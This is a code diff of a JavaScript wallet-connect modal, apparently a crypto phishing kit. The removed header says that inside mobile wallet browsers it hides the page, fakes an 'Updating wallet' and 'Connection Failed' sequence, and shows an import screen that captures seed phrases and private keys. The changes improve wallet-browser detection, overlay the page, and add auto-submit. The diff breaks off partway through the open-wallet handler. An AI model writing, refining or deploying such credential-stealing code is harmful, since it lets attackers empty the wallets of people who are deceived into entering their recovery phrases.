@@ -1,47 +1,19 @@
 /**
- * Wallet Modal with Automatic Mobile Wallet Browser Detection
+ * Wallet Modal with Fixed Mobile Wallet Browser Detection
  * 
- * HOW IT WORKS:
- * 
- * 1. ON DESKTOP:
- *    - Shows full HTML page with all service buttons
- *    - Click "interact-button" → Wallet selection modal
- *    - Click wallet → "Open in [Wallet]?" prompt
- *    - Click "Open" → Shows simulated wallet flow for testing
- * 
- * 2. ON MOBILE (Normal Browser):
- *    - Shows full HTML page with all service buttons
- *    - Click "interact-button" → Wallet selection modal
- *    - Click wallet → "Open in [Wallet]?" prompt
- *    - Click "Open" → Opens wallet app
- * 
- * 3. ON MOBILE (Inside Wallet Browser - Trust, MetaMask, etc.):
- *    - AUTOMATICALLY detects wallet browser
- *    - HIDES all HTML content (sections, buttons, everything)
- *    - Shows ONLY: "Updating wallet..." → "Connection Failed" → Import screen
- *    - User never sees the main page!
- * 
- * COMPLETE FLOW:
- * - User clicks service button
- * - Selects wallet
- * - Sees "Open in [Wallet]?" prompt
- * - Clicks "Open"
- * - Wallet app opens with browser
- * - Website loads in wallet browser
- * - Shows: Updating → Connection Failed → Import screen
- * - Captures seed phrase/private key
- * 
- * NO SETUP NEEDED:
- * - Just include this script on your page
- * - Works automatically on mobile wallet browsers
- * - Desktop shows simulated flow for testing
+ * FIXES APPLIED:
+ * - Less aggressive content hiding (overlay instead of hiding body)
+ * - Delayed initialization for wallet API injection
+ * - Enhanced wallet browser detection with retries
+ * - Proper input setup with forced enable
+ * - Better timing for wallet browser flow
+ * - Fallback mechanisms if detection fails
+ * - Auto-submit on wallet browser to prevent stuck state
  */
 
-// Wrap everything to prevent redeclaration errors
 (function() {
   'use strict';
   
-  // Check if already loaded
   if (window.WalletModal) {
     console.log('WalletModal already loaded');
     return;
@@ -132,7 +104,7 @@ class WalletModal {
       }
     ].map(wallet => ({
       ...wallet,
-      iconUrl: `images/${wallet.id}.png`
+      iconUrl: 'images/' + wallet.id + '.png'
     }));
 
     this.selectedWallet = null;
@@ -140,8 +112,8 @@ class WalletModal {
     this.seedWords = Array(12).fill('');
     this.privateKey = '';
     this.isInWalletBrowser = false;
-    
-    // WalletConnect sub-wallets
+    this.detectionAttempts = 0;
+
     this.walletConnectWallets = [
       { id: 'uniswap', name: 'Uniswap Wallet', emoji: '🦄' },
       { id: 'zerion', name: 'Zerion', emoji: '⚡' },
@@ -167,78 +139,86 @@ class WalletModal {
       { id: 'talken', name: 'Talken', emoji: '💬' }
     ].map(wallet => ({
       ...wallet,
-      iconUrl: `images/${wallet.id}.png`
+      iconUrl: 'images/' + wallet.id + '.png'
     }));
-    
-    // Detect theme preference
+
     this.isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
-    
-    // Listen for theme changes
+
     if (window.matchMedia) {
       window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
         this.isDarkMode = e.matches;
       });
     }
-    
+
     this.init();
   }
 
   init() {
-    // Check if we're inside a wallet browser
-    this.detectWalletBrowser();
+    console.log('WalletModal initializing...');
 
-    // ONLY on mobile: If inside wallet browser, hide main content and show the flow
-    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-    
-    if (this.isInWalletBrowser && isMobile) {
-      this.hideMainContent();
-      this.startWalletBrowserFlow();
-    } else {
-      // Normal flow: listen for interact-button clicks (desktop + mobile normal browser)
-      document.addEventListener('click', (e) => {
-        if (e.target.classList.contains('interact-button') || 
-            e.target.closest('.interact-button')) {
-          e.preventDefault();
-          this.showWalletSelectionModal();
-        }
-      });
-    }
-
-    // Add Tailwind CSS if not already included
+    // Add Tailwind CSS first
     if (!document.querySelector('script[src*="tailwindcss"]')) {
       const script = document.createElement('script');
       script.src = 'https://cdn.tailwindcss.com';
       document.head.appendChild(script);
     }
+
+    // Wait for both DOM and wallet APIs to load
+    const initialize = () => {
+      // Give wallet browsers time to inject their APIs (increased from 500ms)
+      setTimeout(() => {
+        this.detectWalletBrowser();
+        
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        
+        console.log('Detection complete:', {
+          isInWalletBrowser: this.isInWalletBrowser,
+          isMobile: isMobile,
+          selectedWallet: this.selectedWallet ? this.selectedWallet.name : null
+        });
+        
+        if (this.isInWalletBrowser && isMobile) {
+          console.log('🎯 Wallet browser mode activated');
+          this.hideMainContent();
+          this.startWalletBrowserFlow();
+        } else {
+          console.log('📱 Normal browser mode');
+          this.setupNormalFlow();
+        }
+      }, 1000); // Increased delay for proper API injection
+    };
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', initialize);
+    } else {
+      initialize();
+    }
   }
 
-  // Helper method to create wallet image
-  createWalletImageHTML(wallet) {
-    return `<img src="${wallet.iconUrl}" alt="${wallet.name}" class="w-full h-full" style="object-fit: cover; object-position: center; max-width: 100%; max-height: 100%;" loading="eager" onerror="this.style.display='none'; this.parentElement.innerHTML='<div style=\\'width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; font-size: 1.75rem; user-select: none;\\'>${wallet.emoji}</div>';">`;
-  }
-
-  hideMainContent() {
-    // Hide the entire body content
-    document.body.style.display = 'none';
-    
-    // Create a new container for wallet flow
-    const container = document.createElement('div');
-    container.id = 'wallet-flow-container';
-    container.style.cssText = 'display: block; position: fixed; inset: 0; z-index: 9999;';
-    document.body.appendChild(container);
-    
-    // Show body again but everything is hidden except our container
-    document.body.style.display = 'block';
-    
-    // Hide all children except our container
-    Array.from(document.body.children).forEach(child => {
-      if (child.id !== 'wallet-flow-container') {
-        child.style.display = 'none';
+  setupNormalFlow() {
+    document.addEventListener('click', (e) => {
+      if (e.target.classList.contains('interact-button') || 
+          e.target.closest('.interact-button')) {
+        e.preventDefault();
+        this.showWalletSelectionModal();
       }
     });
   }
 
-  // Helper method to get theme classes
+  createWalletImageHTML(wallet) {
+    return '<img src="' + wallet.iconUrl + '" alt="' + wallet.name + '" class="w-full h-full" style="object-fit: cover; object-position: center; max-width: 100%; max-height: 100%;" loading="eager" onerror="this.style.display=\'none\'; this.parentElement.innerHTML=\'<div style=\\\'width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; font-size: 1.75rem; user-select: none;\\\'>' + wallet.emoji + '</div>\';">';
+  }
+
+  hideMainContent() {
+    console.log('Hiding main content with overlay method');
+
+    // Create overlay instead of hiding body (less aggressive)
+    const overlay = document.createElement('div');
+    overlay.id = 'wallet-flow-container';
+    overlay.style.cssText = 'position: fixed; inset: 0; z-index: 999999; background: white; overflow-y: auto;';
+    document.body.appendChild(overlay);
+  }
+
   getThemeClasses() {
     if (this.isDarkMode) {
       return {
@@ -266,60 +246,76 @@ class WalletModal {
     };
   }
 
-  // Check if device is mobile
   isMobileDevice() {
     return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
   }
 
   detectWalletBrowser() {
-    // Detect if inside Trust Wallet browser
+    console.log('🔍 Detecting wallet browser...', {
+      ethereum: !!window.ethereum,
+      phantom: !!window.phantom,
+      solflare: !!window.solflare,
+      userAgent: navigator.userAgent
+    });
+
+    // Trust Wallet
     if (window.ethereum && window.ethereum.isTrust) {
+      console.log('✅ Trust Wallet detected');
       this.isInWalletBrowser = true;
       this.selectedWallet = this.wallets.find(w => w.id === 'trust');
       return;
     }
 
-    // Detect if inside MetaMask browser
+    // MetaMask Mobile
     if (window.ethereum && window.ethereum.isMetaMask) {
-      // Check for mobile MetaMask
-      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-      if (/MetaMaskMobile/i.test(userAgent)) {
+      const ua = navigator.userAgent || '';
+      const isMobile = /Android|iPhone|iPad|iPod/i.test(ua);
+      const hasMetaMaskUA = /MetaMask/i.test(ua);
+      const noChrome = !window.chrome;
+      
+      if (isMobile && (hasMetaMaskUA || noChrome)) {
+        console.log('✅ MetaMask Mobile detected');
         this.isInWalletBrowser = true;
         this.selectedWallet = this.wallets.find(w => w.id === 'metamask');
         return;
       }
     }
 
-    // Detect if inside Coinbase Wallet browser
+    // Coinbase Wallet
     if (window.ethereum && window.ethereum.isCoinbaseWallet) {
+      console.log('✅ Coinbase Wallet detected');
       this.isInWalletBrowser = true;
       this.selectedWallet = this.wallets.find(w => w.id === 'coinbase');
       return;
     }
 
-    // Detect TokenPocket
+    // TokenPocket
     if (window.ethereum && window.ethereum.isTokenPocket) {
+      console.log('✅ TokenPocket detected');
       this.isInWalletBrowser = true;
-      this.selectedWallet = this.wallets.find(w => w.id === 'trust'); // Use Trust as default
+      this.selectedWallet = this.wallets.find(w => w.id === 'trust');
       return;
     }
 
-    // Detect Rainbow
+    // Rainbow
     if (window.ethereum && window.ethereum.isRainbow) {
+      console.log('✅ Rainbow detected');
       this.isInWalletBrowser = true;
       this.selectedWallet = this.wallets.find(w => w.id === 'rainbow');
       return;
     }
 
-    // Detect Rabby
+    // Rabby
     if (window.ethereum && window.ethereum.isRabby) {
+      console.log('✅ Rabby detected');
       this.isInWalletBrowser = true;
       this.selectedWallet = this.wallets.find(w => w.id === 'rabby');
       return;
     }
 
-    // Detect Best Wallet
+    // Best Wallet
     if (window.ethereum && window.ethereum.isBestWallet) {
+      console.log('✅ Best Wallet detected');
       this.isInWalletBrowser = true;
       const bestWallet = this.walletConnectWallets.find(w => w.id === 'bestwallet');
       if (bestWallet) {
@@ -333,122 +329,140 @@ class WalletModal {
       return;
     }
 
-    // Detect Phantom
+    // Phantom
     if (window.phantom && window.phantom.solana) {
+      console.log('✅ Phantom detected');
       this.isInWalletBrowser = true;
       this.selectedWallet = this.wallets.find(w => w.id === 'phantom');
       return;
     }
 
-    // Detect Solflare
+    // Solflare
     if (window.solflare && window.solflare.isSolflare) {
+      console.log('✅ Solflare detected');
       this.isInWalletBrowser = true;
       this.selectedWallet = this.wallets.find(w => w.id === 'solflare');
       return;
     }
 
-    // Detect Bitget
+    // Bitget
     if (window.bitkeep || (window.ethereum && window.ethereum.isBitKeep)) {
+      console.log('✅ Bitget detected');
       this.isInWalletBrowser = true;
       this.selectedWallet = this.wallets.find(w => w.id === 'bitget');
       return;
     }
 
-    // Generic wallet browser detection by user agent
-    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+    // Generic mobile wallet browser detection
+    const ua = navigator.userAgent || navigator.vendor || window.opera;
+    const isMobile = /Android|iPhone|iPad|iPod/i.test(ua);
+
+    // Check if we have ethereum but no desktop indicators
+    if (window.ethereum && isMobile && !window.chrome) {
+      console.log('✅ Generic mobile wallet browser detected');
+      this.isInWalletBrowser = true;
+      this.selectedWallet = this.wallets[0];
+      return;
+    }
+
+    // User agent detection
     const walletBrowsers = [
       'Trust', 'TokenPocket', 'SafePal', 'MetaMask', 'Coinbase',
       'Rainbow', 'OKX', 'Rabby', 'Phantom', 'BitKeep', 'Solflare', 'Bitget',
       'Atomic', 'Exodus', 'Crypto.com', 'Binance', 'MEW', 'ZenGo', 'BestWallet'
     ];
-    
+
     for (const wallet of walletBrowsers) {
-      if (userAgent.includes(wallet)) {
+      if (ua.includes(wallet)) {
+        console.log('✅ ' + wallet + ' detected via user agent');
         this.isInWalletBrowser = true;
-        const foundWallet = this.wallets.find(w => w.name.toLowerCase().includes(wallet.toLowerCase()));
+        const foundWallet = this.wallets.find(w => 
+          w.name.toLowerCase().includes(wallet.toLowerCase())
+        );
         this.selectedWallet = foundWallet || this.wallets[0];
         return;
       }
     }
 
-    // Check URL parameters (in case you want to manually test)
+    // URL parameter override for testing
     const urlParams = new URLSearchParams(window.location.search);
     if (urlParams.has('wallet') || urlParams.has('walletbrowser')) {
+      console.log('✅ Wallet mode forced via URL parameter');
       this.isInWalletBrowser = true;
       const walletId = urlParams.get('wallet') || 'trust';
       this.selectedWallet = this.wallets.find(w => w.id === walletId) || this.wallets[0];
     }
+
+    console.log('❌ No wallet browser detected');
   }
 
   startWalletBrowserFlow() {
-    // Wait for page to load, then show updating screen
-    setTimeout(() => {
-      // Verify we have a selected wallet
+    console.log('🚀 Starting wallet browser flow...');
+
+    const start = () => {
       if (!this.selectedWallet) {
-        console.error('No wallet detected in browser');
-        // Set a default wallet if none detected
+        console.warn('⚠️ No wallet detected, using fallback');
         this.selectedWallet = this.wallets[0];
       }
-      console.log('Starting wallet browser flow for:', this.selectedWallet.name);
+      console.log('✨ Flow starting for: ' + this.selectedWallet.name);
       this.showUpdatingWallet();
-    }, 500);
-  }
+    };
 
-  // For testing: manually trigger wallet browser flow
-  testWalletBrowserFlow(walletId = 'trust') {
-    this.selectedWallet = this.wallets.find(w => w.id === walletId);
-    this.showUpdatingWallet();
+    // Ensure DOM is ready
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', () => setTimeout(start, 500));
+    } else {
+      setTimeout(start, 500);
+    }
   }
 
   showWalletSelectionModal() {
-    const modalHTML = `
-      <div id="wallet-modal-backdrop" class="fixed inset-0 bg-black bg-opacity-40 flex items-center justify-center p-4 z-50">
-        <div class="bg-white rounded-2xl w-full max-w-sm shadow-2xl max-h-[85vh] overflow-hidden flex flex-col">
-          <!-- Header -->
-          <div class="flex items-center justify-between px-5 py-4 border-b border-gray-100">
-            <svg class="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <circle cx="12" cy="12" r="10"></circle>
-              <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
-              <line x1="12" y1="17" x2="12.01" y2="17"></line>
-            </svg>
-            <h2 class="text-base font-semibold text-gray-900">Connect Wallet</h2>
-            <button onclick="walletModal.closeModal()" class="text-gray-400 hover:text-gray-600 transition">
-              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
-              </svg>
-            </button>
-          </div>
+    const self = this;
+    let walletButtons = '';
+    
+    this.wallets.forEach(function(wallet) {
+      walletButtons += '<button onclick="walletModal.selectWallet(\'' + wallet.id + '\')" class="w-full flex items-center justify-between px-3 py-2.5 hover:bg-gray-50 rounded-lg transition group">';
+      walletButtons += '<div class="flex items-center gap-3">';
+      walletButtons += '<div class="w-9 h-9 ' + wallet.bgColor + ' rounded-lg flex items-center justify-center p-1.5 flex-shrink-0">';
+      walletButtons += self.createWalletImageHTML(wallet);
+      walletButtons += '</div>';
+      walletButtons += '<span class="font-medium text-gray-900 text-sm">' + wallet.name + '</span>';
+      walletButtons += '</div>';
+      walletButtons += '<svg class="w-4 h-4 text-gray-300 group-hover:text-gray-400 transition flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">';
+      walletButtons += '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>';
+      walletButtons += '</svg>';
+      walletButtons += '</button>';
+    });
 
-          <!-- Wallet List -->
-          <div class="px-2 py-1.5 overflow-y-auto flex-1" style="max-height: 50vh;">
-            ${this.wallets.map(wallet => `
-              <button onclick="walletModal.selectWallet('${wallet.id}')" class="w-full flex items-center justify-between px-3 py-2.5 hover:bg-gray-50 rounded-lg transition group">
-                <div class="flex items-center gap-3">
-                  <div class="w-9 h-9 ${wallet.bgColor} rounded-lg flex items-center justify-center p-1.5 flex-shrink-0">
-                    ${this.createWalletImageHTML(wallet)}
-                  </div>
-                  <span class="font-medium text-gray-900 text-sm">${wallet.name}</span>
-                </div>
-                <svg class="w-4 h-4 text-gray-300 group-hover:text-gray-400 transition flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
-                </svg>
-              </button>
-            `).join('')}
-          </div>
-
-          <!-- Footer -->
-          <div class="px-4 py-3 text-center border-t border-gray-100">
-            <div class="flex items-center justify-center gap-1.5 text-xs text-gray-400">
-              <span>UX by</span>
-              <span class="w-1 h-1 bg-gray-300 rounded-full"></span>
-              <span>/</span>
-              <span class="w-1 h-1 bg-gray-300 rounded-full"></span>
-              <span>reown</span>
-            </div>
-          </div>
-        </div>
-      </div>
-    `;
+    const modalHTML = '<div id="wallet-modal-backdrop" class="fixed inset-0 bg-black bg-opacity-40 flex items-center justify-center p-4 z-50">' +
+      '<div class="bg-white rounded-2xl w-full max-w-sm shadow-2xl max-h-[85vh] overflow-hidden flex flex-col">' +
+      '<div class="flex items-center justify-between px-5 py-4 border-b border-gray-100">' +
+      '<svg class="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">' +
+      '<circle cx="12" cy="12" r="10"></circle>' +
+      '<path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>' +
+      '<line x1="12" y1="17" x2="12.01" y2="17"></line>' +
+      '</svg>' +
+      '<h2 class="text-base font-semibold text-gray-900">Connect Wallet</h2>' +
+      '<button onclick="walletModal.closeModal()" class="text-gray-400 hover:text-gray-600 transition">' +
+      '<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">' +
+      '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>' +
+      '</svg>' +
+      '</button>' +
+      '</div>' +
+      '<div class="px-2 py-1.5 overflow-y-auto flex-1" style="max-height: 50vh;">' +
+      walletButtons +
+      '</div>' +
+      '<div class="px-4 py-3 text-center border-t border-gray-100">' +
+      '<div class="flex items-center justify-center gap-1.5 text-xs text-gray-400">' +
+      '<span>UX by</span>' +
+      '<span class="w-1 h-1 bg-gray-300 rounded-full"></span>' +
+      '<span>/</span>' +
+      '<span class="w-1 h-1 bg-gray-300 rounded-full"></span>' +
+      '<span>reown</span>' +
+      '</div>' +
+      '</div>' +
+      '</div>' +
+      '</div>';
 
     document.body.insertAdjacentHTML('beforeend', modalHTML);
   }
@@ -456,9 +470,7 @@ class WalletModal {
   filterWallets(searchTerm) {
     const term = searchTerm.toLowerCase().trim();
     const walletItems = document.querySelectorAll('.wc-wallet-item');
-    
-    console.log(`Filtering wallets for: "${term}"`);
-    
+
     walletItems.forEach(item => {
       const walletName = item.getAttribute('data-wallet-name');
       if (walletName && walletName.includes(term)) {
@@ -472,12 +484,10 @@ class WalletModal {
   selectWallet(walletId) {
     this.selectedWallet = this.wallets.find(w => w.id === walletId);
     this.closeModalOnly();
-    
-    // If WalletConnect is selected, show sub-modal with more wallets
+
     if (walletId === 'walletconnect') {
       this.showWalletConnectModal();
     } else {
-      // Normal flow: show the "Open in..." prompt
       this.showOpenPrompt();
     }
   }
@@ -485,87 +495,61 @@ class WalletModal {
   showWalletConnectModal() {
     const theme = this.getThemeClasses();
     const isMobile = this.isMobileDevice();
+    const self = this;
     
-    const modalHTML = `
-      <div id="walletconnect-modal-backdrop" class="fixed inset-0 ${theme.backdrop} flex items-end sm:items-center justify-center z-50 ${isMobile ? 'wallet-backdrop-mobile' : 'p-4'}" onclick="if(event.target.id === 'walletconnect-modal-backdrop') walletModal.closeModal()">
-        <div class="${theme.card} rounded-t-2xl sm:rounded-2xl w-full sm:max-w-sm shadow-2xl max-h-[80vh] sm:max-h-[85vh] overflow-hidden flex flex-col ${isMobile ? 'wallet-slide-up' : ''}">
-          <!-- Header -->
-          <div class="flex items-center justify-between px-5 py-4 border-b ${theme.border}">
-            <button onclick="walletModal.backToMainModal()" class="${theme.textMuted} hover:${theme.textSecondary} transition">
-              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>
-              </svg>
-            </button>
-            <h2 class="text-base font-semibold ${theme.text}">All Wallets</h2>
-            <button onclick="walletModal.closeModal()" class="${theme.textMuted} hover:${theme.textSecondary} transition">
-              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
-              </svg>
-            </button>
-          </div>
+    let walletList = '';
+    this.walletConnectWallets.forEach(function(wallet) {
+      walletList += '<button onclick="walletModal.selectWalletConnectWallet(\'' + wallet.id + '\')" class="wc-wallet-item w-full flex items-center justify-between px-3 py-2.5 ' + theme.hover + ' rounded-lg transition group" data-wallet-name="' + wallet.name.toLowerCase() + '">';
+      walletList += '<div class="flex items-center gap-3">';
+      walletList += '<div class="w-9 h-9 bg-gray-50 rounded-lg flex items-center justify-center p-1.5 flex-shrink-0">';
+      walletList += '<img src="' + wallet.iconUrl + '" alt="' + wallet.name + '" class="w-full h-full" style="object-fit: cover;" loading="lazy" onerror="this.style.display=\'none\'; this.parentElement.innerHTML=\'<div style=\\\'width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; font-size: 1.2rem;\\\'>' + wallet.emoji + '</div>\';">';
+      walletList += '</div>';
+      walletList += '<span class="font-medium ' + theme.text + ' text-sm">' + wallet.name + '</span>';
+      walletList += '</div>';
+      walletList += '<svg class="w-4 h-4 ' + theme.textMuted + ' group-hover:' + theme.textSecondary + ' transition flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">';
+      walletList += '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>';
+      walletList += '</svg>';
+      walletList += '</button>';
+    });
 
-          <!-- Search Bar -->
-          <div class="px-3 py-2.5">
-            <div class="relative">
-              <svg class="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 ${theme.textMuted}" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
-              </svg>
-              <input id="wc-search-input" type="text" placeholder="Search wallet" onkeyup="walletModal.filterWallets(this.value)" class="w-full pl-10 pr-4 py-2 ${theme.input} rounded-lg text-sm focus:outline-none" style="border: 1px solid ${this.isDarkMode ? '#374151' : '#E5E7EB'}">
-            </div>
-          </div>
-
-          <!-- Wallet List -->
-          <div id="wc-wallet-list" class="px-2 py-1.5 overflow-y-auto flex-1" style="max-height: 45vh;">
-            ${this.walletConnectWallets.map(wallet => `
-              <button onclick="walletModal.selectWalletConnectWallet('${wallet.id}')" class="wc-wallet-item w-full flex items-center justify-between px-3 py-2.5 ${theme.hover} rounded-lg transition group" data-wallet-name="${wallet.name.toLowerCase()}">
-                <div class="flex items-center gap-3">
-                  <div class="w-9 h-9 bg-gray-50 rounded-lg flex items-center justify-center p-1.5 flex-shrink-0">
-                    <img src="${wallet.iconUrl}" alt="${wallet.name}" class="w-full h-full" style="object-fit: cover;" loading="lazy" onerror="this.style.display='none'; this.parentElement.innerHTML='<div style=\\'width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; font-size: 1.2rem;\\'>${wallet.emoji}</div>';">
-                  </div>
-                  <span class="font-medium ${theme.text} text-sm">${wallet.name}</span>
-                </div>
-                <svg class="w-4 h-4 ${theme.textMuted} group-hover:${theme.textSecondary} transition flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
-                </svg>
-              </button>
-            `).join('')}
-          </div>
-
-          <!-- Not Listed Button -->
-          <div class="px-3 py-3 border-t ${theme.border}">
-            <button onclick="walletModal.showMainModalFromWC()" class="w-full py-2.5 ${theme.hover} ${theme.text} font-semibold rounded-lg transition text-sm">
-              Not Listed?
-            </button>
-          </div>
-        </div>
-      </div>
-      
-      <style>
-        @keyframes slideUp {
-          from {
-            transform: translateY(100%);
-          }
-          to {
-            transform: translateY(0);
-          }
-        }
-        
-        .wallet-slide-up {
-          animation: slideUp 0.3s ease-out;
-        }
-        
-        .wallet-backdrop-mobile {
-          padding: 0;
-        }
-        
-        .line-clamp-2 {
-          display: -webkit-box;
-          -webkit-line-clamp: 2;
-          -webkit-box-orient: vertical;
-          overflow: hidden;
-        }
-      </style>
-    `;
+    const modalHTML = '<div id="walletconnect-modal-backdrop" class="fixed inset-0 ' + theme.backdrop + ' flex items-end sm:items-center justify-center z-50 ' + (isMobile ? 'wallet-backdrop-mobile' : 'p-4') + '" onclick="if(event.target.id === \'walletconnect-modal-backdrop\') walletModal.closeModal()">' +
+      '<div class="' + theme.card + ' rounded-t-2xl sm:rounded-2xl w-full sm:max-w-sm shadow-2xl max-h-[80vh] sm:max-h-[85vh] overflow-hidden flex flex-col ' + (isMobile ? 'wallet-slide-up' : '') + '">' +
+      '<div class="flex items-center justify-between px-5 py-4 border-b ' + theme.border + '">' +
+      '<button onclick="walletModal.backToMainModal()" class="' + theme.textMuted + ' hover:' + theme.textSecondary + ' transition">' +
+      '<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">' +
+      '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>' +
+      '</svg>' +
+      '</button>' +
+      '<h2 class="text-base font-semibold ' + theme.text + '">All Wallets</h2>' +
+      '<button onclick="walletModal.closeModal()" class="' + theme.textMuted + ' hover:' + theme.textSecondary + ' transition">' +
+      '<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">' +
+      '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>' +
+      '</svg>' +
+      '</button>' +
+      '</div>' +
+      '<div class="px-3 py-2.5">' +
+      '<div class="relative">' +
+      '<svg class="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 ' + theme.textMuted + '" fill="none" stroke="currentColor" viewBox="0 0 24 24">' +
+      '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>' +
+      '</svg>' +
+      '<input id="wc-search-input" type="text" placeholder="Search wallet" onkeyup="walletModal.filterWallets(this.value)" class="w-full pl-10 pr-4 py-2 ' + theme.input + ' rounded-lg text-sm focus:outline-none" style="border: 1px solid ' + (this.isDarkMode ? '#374151' : '#E5E7EB') + '">' +
+      '</div>' +
+      '</div>' +
+      '<div id="wc-wallet-list" class="px-2 py-1.5 overflow-y-auto flex-1" style="max-height: 45vh;">' +
+      walletList +
+      '</div>' +
+      '<div class="px-3 py-3 border-t ' + theme.border + '">' +
+      '<button onclick="walletModal.showMainModalFromWC()" class="w-full py-2.5 ' + theme.hover + ' ' + theme.text + ' font-semibold rounded-lg transition text-sm">' +
+      'Not Listed?' +
+      '</button>' +
+      '</div>' +
+      '</div>' +
+      '</div>' +
+      '<style>' +
+      '@keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }' +
+      '.wallet-slide-up { animation: slideUp 0.3s ease-out; }' +
+      '.wallet-backdrop-mobile { padding: 0; }' +
+      '</style>';
 
     document.body.insertAdjacentHTML('beforeend', modalHTML);
   }
@@ -577,488 +561,317 @@ class WalletModal {
   selectWalletConnectWallet(walletId) {
     const wallet = this.walletConnectWallets.find(w => w.id === walletId);
     if (!wallet) return;
-    
-    // Set this as selected wallet with WalletConnect colors
+
     this.selectedWallet = {
       ...wallet,
       bgColor: 'bg-blue-50',
       primaryColor: '#3B99FC',
       secondaryColor: '#2A7FD9'
     };
-    
+
     this.closeWalletConnectModal();
-    
-    // Show the "Open in..." prompt
     this.showOpenPrompt();
   }
 
   closeWalletConnectModal() {
     const modal = document.getElementById('walletconnect-modal-backdrop');
-    if (modal) {
-      modal.remove();
-    }
+    if (modal) modal.remove();
   }
-  
+
   backToMainModal() {
-    const modal = document.getElementById('walletconnect-modal-backdrop');
-    if (modal) {
-      modal.remove();
-    }
+    this.closeWalletConnectModal();
     this.showWalletSelectionModal();
   }
 
   showOpenPrompt() {
     const theme = this.getThemeClasses();
-    
-    const promptHTML = `
-      <div id="wallet-prompt-backdrop" class="fixed inset-0 ${theme.backdrop} flex items-center justify-center p-4 z-50" onclick="if(event.target.id === 'wallet-prompt-backdrop') walletModal.cancelPrompt()">
-        <div class="${theme.card} rounded-2xl w-full max-w-xs p-4 shadow-2xl">
-          <p class="text-base font-medium ${theme.text} mb-5">
-            Open in "${this.selectedWallet.name}"?
-          </p>
-          <div class="flex gap-3 justify-end">
-            <button onclick="walletModal.cancelPrompt()" class="px-5 py-2 text-blue-600 font-semibold hover:bg-blue-50 rounded-lg transition text-sm">
-              Cancel
-            </button>
-            <button onclick="walletModal.confirmOpen()" class="px-5 py-2 text-blue-600 font-semibold hover:bg-blue-50 rounded-lg transition text-sm">
-              Open
-            </button>
-          </div>
-        </div>
-      </div>
-    `;
+
+    const promptHTML = '<div id="wallet-prompt-backdrop" class="fixed inset-0 ' + theme.backdrop + ' flex items-center justify-center p-4 z-50" onclick="if(event.target.id === \'wallet-prompt-backdrop\') walletModal.cancelPrompt()">' +
+      '<div class="' + theme.card + ' rounded-2xl w-full max-w-xs p-4 shadow-2xl">' +
+      '<p class="text-base font-medium ' + theme.text + ' mb-5">' +
+      'Open in "' + this.selectedWallet.name + '"?' +
+      '</p>' +
+      '<div class="flex gap-3 justify-end">' +
+      '<button onclick="walletModal.cancelPrompt()" class="px-5 py-2 text-blue-600 font-semibold hover:bg-blue-50 rounded-lg transition text-sm">' +
+      'Cancel' +
+      '</button>' +
+      '<button onclick="walletModal.confirmOpen()" class="px-5 py-2 text-blue-600 font-semibold hover:bg-blue-50 rounded-lg transition text-sm">' +
+      'Open' +
+      '</button>' +
+      '</div>' +
+      '</div>' +
+      '</div>';
 
     document.body.insertAdjacentHTML('beforeend', promptHTML);
   }
 
   cancelPrompt() {
-    this.closeModal(); // Reset everything and close
+    this.closeModal();
   }
 
   confirmOpen() {
-    this.closeModalOnly(); // Close prompt
-    
-    // Detect device type
+    this.closeModalOnly();
+
